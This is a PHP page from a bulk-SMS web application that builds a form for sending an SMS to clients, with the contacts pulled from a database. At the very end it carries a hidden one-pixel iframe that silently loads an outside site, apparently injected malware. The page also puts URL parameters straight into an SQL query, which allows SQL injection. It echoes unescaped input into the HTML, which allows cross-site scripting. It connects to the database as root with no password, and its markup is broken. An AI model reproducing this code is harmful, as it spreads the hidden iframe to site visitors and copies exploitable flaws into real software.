<?php
ob_start();
//error_reporting(0);
?>
<body>
<?php
include('header.php');
?>
    <div class="container">
        <div class="row-fluid">
            <div class="span3">

                <div class="hero-unit-3">
                    <div class="alert-index alert-success">
                        <i class="icon-calendar icon-large"></i>
                        <?php
                        $Today = date('y:m:d');
                        $new = date('l, F d, Y', strtotime($Today));
                        echo $new;
                        ?>
                    </div>
                </div>
                <div class="hero-unit-1">
              
                                </div>  
                            </a>

                        </li>
                        
                         <div class="pull-right">
                                   
                                </div>  
                            </a></li>  
                            </a></li> 
                            </a></li>

                    </ul>
                </div>

            </div>
            <div class="span9">
                <br>
                <br>

                <div class="alert alert-info">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    <strong><i class="icon-user icon-large"></i>&nbsp;Send Sms To A Particular Client</strong>
                </div>
                
                <?php
                $tel = $_GET["tel"];
                
				if(isset($_GET["sendsms"])){
                    $msg = $_GET["msg"];
                    $sender = $_GET["sender"];
                    $telform = $_GET["tel"];
}
?>


                <div class="hero-unit-2">
                <form class="form-horizontal" action="comfirm_sms_single_parent.php?tel=<?php echo $telform; ?>&msg=<?php echo $msg; ?>&sender=<?php echo $sender; ?>" method="GET">
                        <div class="control-group">
                            <label class="control-label" for="inputEmail">Contact(s)</label>
                            <div class="controls">

                            <input type="text" name="tel" class="span5" required 
    value="<?php
    $getlevelfromurl=$_GET["level"];
    $getsubjectfromurl=$_GET["subject"];
$con=mysql_connect("localhost","root","");
if(!$con){
echo"connection failed".mysql_error();

}

$selectdb=mysql_select_db("bulk_sms",$con);

if(!$selectdb){
echo"database selection failed".mysql_error();

}

$selectallcontacts="select * from group_elearning where level='$getlevelfromurl' and subject='$getsubjectfromurl' ";
$sqlallcontacts=mysql_query($selectallcontacts);

while($row=mysql_fetch_array($sqlallcontacts)){
echo $row["contact"].",";
}
?>" />                       

                            
                            </textarea>
                                
                            </div>
                        </div>

                        <div class="control-group">
                            <label class="control-label" for="inputEmail">Enter Message</label>
                            <div class="controls">

                                <textarea name="msg" class="span5" required ><?php echo $msg; ?></textarea>
                           
                               
                        </div>
                            
                             <br/>   

   <div class="control-group">
                            <label class="control-label" for="inputEmail">SENDER</label>
                            <div class="controls">

                                <textarea name="sender" class="span5" required ><?php echo $sender; ?></textarea>
                           
                               
                        </div>
                             <br/>  
                        <div class="control-group">
                            <div class="controls">
			<button type="submit" name="sendsms" class="btn btn-success"><i class="icon-plus-sign icon-large"></i>&nbsp;Send Sms</button>
<a href="listelearning.php">Click here to move back</a>
                            </div>
                          
                        </div>
                    </form>
                </div>
                <!-- end slider -->
            </div>

        </div>
        <?php include('footer.php'); ?>
    </div>
</div>
</div>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>


